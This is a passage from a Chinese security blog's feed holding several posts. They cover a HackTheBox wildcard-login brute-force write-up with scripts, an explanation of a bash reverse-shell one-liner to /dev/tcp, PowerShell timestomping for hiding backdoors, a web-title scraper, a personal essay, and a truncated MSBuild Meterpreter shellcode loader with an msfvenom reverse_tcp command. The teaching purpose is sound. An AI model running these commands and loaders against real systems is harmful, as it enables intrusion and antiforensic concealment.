src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-4.png" alt="flag"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://www.jianshu.com/p/7c818ddc5731">PHP复杂变量绕过addslashes()直接拿shell</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> 代码注入 </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox PhoneBook WriteUP</title>
      <link href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/"/>
      <url>/2023/08/22/HackTheBox_PhoneBook_WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目给出的网页是这样</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-2.png" alt="index"></p><p>看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS)</p><pre><code class="HTML">&lt;script&gt;  const queryString = window.location.search;if (queryString) &#123;  const urlParams = new URLSearchParams(queryString);  const message = urlParams.get(&#39;message&#39;);  if (message) &#123;    document.getElementById(&quot;message&quot;).innerHTML = message;    document.getElementById(&quot;message&quot;).style.visibility = &quot;visible&quot;;    &#125;  &#125;&lt;/script&gt;</code></pre><p>但是XSS是需要人触发的，题目中并没有给出任何BOT的信息。</p><p>所以最终的解法要落在登录功能上。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>登录功能可以通过通配符<code>*</code>进入，登录成功之后是一个只有搜索框的页面（这里忘记截图了）。搜索功能可以找到若干账户的信息。</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-3.png" alt="搜索"></p><p>题目的提示是：<code>Who is lucky enough to be included in the phonebook?</code>，所以我们应该想办法获取能登录的账号密码。</p><p>登录功能可以识别通配符，所以直接写脚本遍历就好了。</p><blockquote><p>userbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        uname = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: uname, &quot;password&quot;: &quot;*&quot;&#125;        resp = requests.post(url, data=data, allow_redirects=False)        print(uname+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><blockquote><p>passbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        password = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: &quot;REESE&quot;, &quot;password&quot;: password&#125;        resp = requests.post(url, data=data, allow_redirects=False)        # print(password+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><p>取得flag：</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-4.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>真正的解题思路是看了别人的writeup才明白的，通配符这是真没想到……</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Linux下反弹Shell命令的解释</title>
      <link href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/"/>
      <url>/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<p>Linux下反弹shell最常用的一句命令：</p><pre><code class="shell">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/1337 &lt;&amp;1&#39;</code></pre><p>对这条命令的理解，以我个人经历而言，大概分为几个阶段</p><ol><li>知道怎么用，但是记不住，用的时候就百度；</li><li>大概背过了，也能理解命令某些部分的含义，但仍然不清不楚；</li><li>完全理解了命令的每一部分的含义，可以脱离死记硬背，并写出不同形式的命令；</li></ol><p>说来惭愧，入行多年了，今天才完成第三步，这里仅作一次记录。<br>详细原理三言两语较难说清，这里简单提炼一下主要知识点。</p><hr><p>前置理论：</p><ol><li><strong>Linux下的一切都是文件</strong>；</li><li>Linux中的文件描述符：</li></ol><ul><li>标准输入 - 0 （默认设备键盘）</li><li>标准输出 - 1 （默认设备显示器）</li><li>错误输出 - 2 （默认设备显示器）</li></ul><ol start="3"><li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。</li></ol><hr><p>那么，下面简单拆解一下反弹shell的命令<br><code>bash -c</code>：不解释了；<br><code>bash -i</code>：表示启动一个交互式的Shell；<br><code>&amp;&gt;</code>：表示将所有输出重定向；<br><code>/dev/tcp/ip/port</code>：表示目标的地址*(Linux下一切皆是文件)*；<br><code>&lt;&amp;1</code>：表示将标准输入重定向至标准输出的目标；</p><p>简而言之，<code>&amp;&gt;</code>实现了命令输入在攻击端完成，<code>&lt;&amp;1</code>实现了命令结果输出在攻击端。</p><hr><p>参考资料：</p><ul><li><a href="https://item.jd.com/12443890.html">《鸟哥的Linux私房菜》</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Powershell修改文件/文件夹时间属性</title>
      <link href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/"/>
      <url>/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>后门隐藏</li><li>蜜罐搭建</li><li>钓鱼&#x2F;水坑攻击</li></ul><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><h3 id="单文件时间属性修改"><a href="#单文件时间属性修改" class="headerlink" title="单文件时间属性修改"></a>单文件时间属性修改</h3><pre><code class="powershell">#最后访问时间$(Get-Item &quot;C:/path/to/yourfile&quot;).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#最后保存时间$(Get-Item &quot;C:/path/to/yourfile&quot;).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#文件创建时间$(Get-Item &quot;C:/path/to/yourfile&quot;).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)</code></pre><h3 id="多文件时间属性批量修改"><a href="#多文件时间属性批量修改" class="headerlink" title="多文件时间属性批量修改"></a>多文件时间属性批量修改</h3><pre><code class="powershell">#当前目录所有文件及文件夹时间属性修改foreach($n in $(Get-ChildItem).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#仅修改当前目录文件的时间属性（不包含文件夹）foreach($n in $(Get-ChildItem -File).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#仅修改当前目录文件夹的时间属性（不包含文件）foreach($n in $(Get-ChildItem -Directory).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#修改当前目录下所有文件及文件夹的时间属性（包括子文件夹）foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#将当前目录下所有文件及文件夹时间属性设置为随机时间#示例时间随机范围为2019/1/2至操作系统当前时间foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).LastWriteTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).CreationTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)&#125; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> 欺骗 </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个Get-Title的自我修养</title>
      <link href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/"/>
      <url>/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要整理大量的网页资料，刚好完善一下以前写的get-title脚本。<br>目标：获取所有URL对应网页的Title，并以友好的格式输出至文件。<br>此脚本原来是渗透的时候搞网段用的，把扫出来的Web的title列举出来，从而对自己的目标有个大致的概念。但是早先的版本只能说是可以将就着用，往往输出的格式乱七八糟，刚好借着这次机会重写一下。也顺便将其从python2过渡到python3。</p><h1 id="0x01-版本对比"><a href="#0x01-版本对比" class="headerlink" title="0x01 版本对比"></a>0x01 版本对比</h1><p>早期版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupfrom threading import Threadfrom Queue import Queueimport sysimport timeimport signalimport chardetdef getTitle(line):    try:        line=line.strip()        re = requests.get(line, timeout=2)        ret2.write(line + &#39;\n&#39;)        print line+&#39;\t\t&#39;+str(re.status_code)        if re.status_code==200:            text=BeautifulSoup(re.content,&#39;html.parser&#39;)            titles=text.find(&#39;title&#39;)            title=str(titles)            ret.write(line+&#39;\t\t&#39;+title+&#39;\n&#39;)        else:            ret.write(line + &#39;\t\t&#39; + &#39;Error Code:&#39; + re.status_code + &#39;\n&#39;)    except requests.exceptions.Timeout:        ret2.write(line + &#39;\terror\n&#39;)        print line+&#39;\t\ttime out&#39;        ret.write(line+&#39;\t\t&#39;+ &#39;Time out\n&#39;)class Worker(Thread):    def __init__(self, taskQueue):        Thread.__init__(self)        self.setDaemon(True)        self.taskQueue = taskQueue        self.start()    def run(self):        while 1:            try:                callable, args, kwds = self.taskQueue.get(block=False)                callable(*args, **kwds)            except:                breakclass ThreadPool:    def __init__(self):        self.threads = []        self.taskQueue = Queue()        self.threadNum = num_thread        self.__create_taskqueue()        self.__create_threadpool(self.threadNum)    def __create_taskqueue(self):        f = open(&quot;target.txt&quot;, &#39;r&#39;)        lines = f.readlines()        for line in lines:            self.add_task(getTitle, line)        f.close()    def __create_threadpool(self, threadNum):        for i in range(threadNum):            thread = Worker(self.taskQueue)            self.threads.append(thread)    def add_task(self, callable, *args, **kwds):        self.taskQueue.put((callable, args, kwds))    def new_complete(self):        while 1:            time.sleep(0.1)            alive = False            for i in range(num_thread):                alive = alive or self.threads[i].isAlive()            if not alive:                breakdef handler(signum, frame):    global is_exit    print &quot;CTRL+C Is Pressed&quot;    sys.exit(0)if __name__ == &#39;__main__&#39;:    num_thread = 20    signal.signal(signal.SIGINT, handler)    signal.signal(signal.SIGTERM, handler)    ret = open(&quot;titles.txt&quot;, &quot;w&quot;)    ret2=open(&quot;test.txt&quot;,&#39;w&#39;)    tp = ThreadPool()    tp.new_complete()    ret.close()    ret2.close()</code></pre><p>重写极简版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupres=requests.get(url)soup=BeautifulSoup(res.text,&#39;html.parser&#39;)print(soup.title.string)</code></pre><p>最终版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=3def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)    except :        return &#39;Timeout&#39;    if res.apparent_encoding != None:        response=res.content.decode(res.apparent_encoding)    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return titledef single_thread(url):    url=url.strip(&#39;\r\n&#39;)    result=url + &#39;\t&#39; + str(get_title(url))    print(result)    with open(&#39;result.txt&#39;,&#39;a+&#39;,encoding=&#39;utf-8&#39;) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    signal(SIGINT, handler)    target=get_urllist(&#39;target.txt&#39;)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()</code></pre><p>简而言之，早期的版本与当前版本区别如下：</p><ul><li>利用多线程的方式有所区别</li><li>解决了不同网页编码格式不同的问题</li><li>增加了代理选项</li><li>解决了微信公众还title爬取不到的问题</li><li>解决一些其他的小BUG</li><li>一些使用体验上的优化</li></ul><h1 id="0x02-探索历程"><a href="#0x02-探索历程" class="headerlink" title="0x02 探索历程"></a>0x02 探索历程</h1><p>早期的版本实际上是直接对其他大佬的代码做的修改，仅仅在使用习惯上做了一些调整，代码逻辑也不甚了解，于是一不做二不休，从零开始重写脚本。</p><h2 id="坑1-微信公众号文章的Title"><a href="#坑1-微信公众号文章的Title" class="headerlink" title="坑1 微信公众号文章的Title"></a>坑1 微信公众号文章的Title</h2><p>最早用极简版测试的时候，发现所有的微信公众号都无法用bs4直接获取到title，于是乎瞅了一眼公众号的源码，title竟然是这个屌样子的……</p><pre><code class="html">&lt;script&gt;    …………    var hd_head_img = &quot;http://xxxxxxxxxx/&quot;||&quot;&quot;;    var ori_head_img_url = &quot;http://xxxxxxxxx/&quot;;    var msg_title = &#39;这里是title&#39;.html(false);    var msg_desc = &quot;XXXXXXXXXX...&quot;;    var msg_cdn_url = &quot;http://XXXXXX/...&quot;;     …………&lt;/script&gt;</code></pre><p>丧心病狂啊……这操作我没太看明白，防爬？</p><p>想多了吧。</p><p>直接正则一把梭：</p><pre><code class="python">if &#39;mp.weixin.qq.com&#39; in url:    rule=r&quot;var msg_title = &#39;.*&#39;&quot;    title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)</code></pre><h2 id="坑2-没有Title"><a href="#坑2-没有Title" class="headerlink" title="坑2 没有Title"></a>坑2 没有Title</h2><p>有些链接是文件的下载链接，没有Title，于是引发bs4报错，于是引发脚本崩溃，这……</p><pre><code class="python">soup=BeautifulSoup(response,&#39;html.parser&#39;)if soup.title:    title=str(soup.title.string)else :    title=&#39;&#39;</code></pre><h2 id="坑3-User-Agent被拦截"><a href="#坑3-User-Agent被拦截" class="headerlink" title="坑3 User-Agent被拦截"></a>坑3 User-Agent被拦截</h2><p>有的防护设备居然会丧心病狂的拦截requests的UA……</p><pre><code class="python">headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;try:    res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)except :    return &#39;Timeout&#39;</code></pre><h2 id="坑4-编码问题"><a href="#坑4-编码问题" class="headerlink" title="坑4 编码问题"></a>坑4 编码问题</h2><p>这其实是个挺头疼的问题，之前第一版的脚本就一直没有解决。<br>以前读取<code>response</code>的内容，一般是通过两个方式，<code>res.text()</code>或者<code>res.content()</code>。但是这样有一个很头疼的问题，就是每个网站的编码方式不一样，尤其中文网站，用<code>GBK</code>的和用<code>UTF-8</code>的网站几乎一样多。于是输出的时候就是各种乱七八糟的乱码，而一个文件又不可能同时有两种编码格式。<br>经过艰(qing)难(jiao)研(da)究(lao)，最终确定了两种解决方案：</p><ol><li>通过<code>chardet</code>确定编码格式，最终统一成同一种编码方式；</li><li>读取网页<code>response</code>头中的编码格式，然后decode；</li></ol><p>最终我采用的是方案2：</p><pre><code class="python">response = res.content.decode(res.apparent_encoding)</code></pre><p>这里又有一个小坑，有些网站的response头中不会返回编码格式……</p><p>这类网站往往都是默认采用<code>UTF-8</code>格式编码，所以我们直接用<code>res.text</code>就可以了：</p><pre><code class="python">if res.apparent_encoding != None:    response=res.content.decode(res.apparent_encoding)else:    response=res.text</code></pre><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这次脚本的编写还算比较顺利（毕竟是个很简单的东西），从开始到调试、完工也不过花了两个多小时，还不如写这篇文章花的时间多，大部分时间都花在了滤坑上面。但是其实还是可以分析出一些东西，一是本人确实久疏战阵，不太熟练了；二来，即便比早先的版本改进了一些，但距离作为一个成熟的工具，仍有许多可以改进的地方。</p><h2 id="仍然存在的缺陷"><a href="#仍然存在的缺陷" class="headerlink" title="仍然存在的缺陷"></a>仍然存在的缺陷</h2><ol><li>遭遇某些编码格式的网站时，仍然会报错（如<code>cp1254</code>等）；</li></ol><pre><code class="python">  File &quot;.\get-title.py&quot;, line 28, in get_title    response=res.content.decode(res.apparent_encoding)  File &quot;C:\Environment\Python38\lib\encodings\cp1254.py&quot;, line 15, in decode    return codecs.charmap_decode(input,errors,decoding_table)</code></pre><ol start="2"><li>对于一些比较常见的反爬虫手段，无能为力（爬到的title是<code>Just a moment...</code>，说明在自动验证是否真人访问）</li></ol><h2 id="可以改进的方向"><a href="#可以改进的方向" class="headerlink" title="可以改进的方向"></a>可以改进的方向</h2><ol><li>增加代理池模式，用以解决部分网站TimeOut的问题；</li><li>更加友好的结果呈现，可输出至Excel表格中，最好舍弃csv采用xlsx，因为获取的title千奇百怪，可能破坏csv的格式；</li><li>自动识别一些常见的中间件，如Weblogic等等；</li></ol><h1 id="0x04-2021-2-26更新"><a href="#0x04-2021-2-26更新" class="headerlink" title="0x04 2021.2.26更新"></a>0x04 2021.2.26更新</h1><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitfrom sys import argvuse_proxy=Trueproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;,&#39;https&#39;:&#39;http://127.0.0.1:10809&#39;&#125;# proxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=10result_encode_type=&#39;gb18030&#39;def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    if &#39;http&#39; not in url:        url = &#39;http://&#39;+url    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        if use_proxy:            res = requests.get(url,headers=headers,proxies=proxies,timeout=timeout)        else:            res = requests.get(url,headers=headers,timeout=timeout)    except Exception as e:        print(e)        return &#39;Timeout&#39;    if res.apparent_encoding != None:        try:            encode_type=res.apparent_encoding            response=res.content.decode(encode_type)        except:            print(&quot;#Warning# Can&#39;t decode string as 【%s】.Target URL is 【%s】.&quot; % (res.apparent_encoding,url))            response=res.text    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return title.strip(&#39;\r\n&#39;)def single_thread(url):    url=url.strip(&#39;\r\n&#39;)    if not url:        return    result=&#39;&quot;&#39;+url + &#39;&quot;,&quot;&#39; + str(get_title(url))+&#39;&quot;&#39;    print(result)    with open(&#39;result.csv&#39;,&#39;a+&#39;,encoding=result_encode_type) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    if len(argv)!=2:        print(&#39;Usage:\n  python3 get-title.py [targetfile]&#39;)        exit()    target_file=argv[1]    signal(SIGINT, handler)    target=get_urllist(target_file)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()    </code></pre><ul><li>优化了输出方式，改为输出到CSV表格；</li><li>修正了爬HTTPS会出现问题的BUG，这么明显的BUG一开始的时候居然没发现……</li><li>修正了部分网站爬取时编码问题异常的BUG；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 - 2021</title>
      <link href="/2021/01/01/2020-2021/"/>
      <url>/2021/01/01/2020-2021/</url>
      
        <content type="html"><![CDATA[<p>总结一下吧。</p><p>2020年是很浑浊的一年，直到昨晚跨年的时候我还是很懵逼，潜意识还完全没意识到2020年就这么过去了。</p><p>这一年发生了很多的事情，对我个人而言，对这个世界而言，都是如此。这中间的共同点是，似乎没有什么事情是比较完满的。但这一篇并不是回忆录，所以我也不打算像收拾抽屉一样把它们一件一件堆叠起来。捡一些想说的说吧。</p><hr><hr><p>说起来，当初选择网络安全方向的初衷，其实是希望学习一些黑客技术，以便能够看到屏闭了我的妹子的QQ空间。</p><p>这个目标至今没有达成。</p><p>而且时过境迁，现在也没有多少人玩QQ了。</p><hr><p>意识到这个目标成为泡影之后，我想过很多次，为什么要留在这个行业。答案是，因为兴趣。</p><p>这是一个仅仅通过技术，就可以获得最原始、最纯粹的成就感的行业。信息安全是一个很广袤的定义，从开锁、到欺骗、到0Day，好像什么东西都能涵盖到信息安全的定义里面，你可以很轻易地在里面找到你感兴趣的东西。而我本人，正如<a href="https://7mitu.github.io/about/">个人描述</a>里说的那样，喜欢每个技能都点一下，传统功夫讲究点到为止（不是）。</p><hr><p>这一年来其实很苦恼，我目前的技术水平也就算个T，但是周围所有人好像都在谈APT。</p><p>饶是我这钛合金脸皮也遭不住天天面部刮痧呀。</p><hr><p>希望2021年：</p><ul><li>疫情早日结束</li><li>找到自己想要的是什么</li><li>钻研技术</li><li>远离一些虚伪</li><li>找个女朋友</li></ul><hr><p>以上。</p><p><img src="/2021/01/01/2020-2021/backiee-114501.jpg" alt="backiee-114501"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用.Net Framework加载Shellcode</title>
      <link href="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-场景"><a href="#0x00-场景" class="headerlink" title="0x00 场景"></a>0x00 场景</h3><ul><li>Windows操作系统</li><li>存在.Net Framework环境</li><li>无法上传exe等可执行文件</li></ul><h3 id="0x01-生成载荷"><a href="#0x01-生成载荷" class="headerlink" title="0x01 生成载荷"></a>0x01 生成载荷</h3><p>这里以MSF Meterpreter载荷为例，首先生成Shellcode：</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=2333 -f csharp</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133105384.png" alt="image-20201228133105384"></p><p>制作MSBuild载荷，将生成的Shellcode粘贴在下方代码的<code>shellcode</code>变量中，并保存为文件<code>bad.xml</code>：</p><pre><code class="xml">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;         &lt;!-- This inline task executes shellcode. --&gt;         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;         &lt;!-- Save This File And Execute The Above Command --&gt;         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;         &lt;!-- License: BSD 3-Clause --&gt;      &lt;Target Name=&quot;Hello&quot;&gt;        &lt;ClassExample /&gt;      &lt;/Target&gt;      &lt;UsingTask        TaskName=&quot;ClassExample&quot;        TaskFactory=&quot;CodeTaskFactory&quot;        AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;        &lt;Task&gt;                  &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;          &lt;![CDATA[        using System;        using System.Runtime.InteropServices;        using Microsoft.Build.Framework;        using Microsoft.Build.Utilities;        public class ClassExample :  Task, ITask        &#123;                   private static UInt32 MEM_COMMIT = 0x1000;                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;                    [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                    [DllImport(&quot;kernel32&quot;)]            private static extern IntPtr CreateThread(                        UInt32 lpThreadAttributes,            UInt32 dwStackSize,            UInt32 lpStartAddress,            IntPtr param,            UInt32 dwCreationFlags,            ref UInt32 lpThreadId                       );          [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 WaitForSingleObject(                       IntPtr hHandle,            UInt32 dwMilliseconds            );                    public override bool Execute()          &#123;            //replace with your own shellcode            byte[] shellcode = new byte[] &#123; 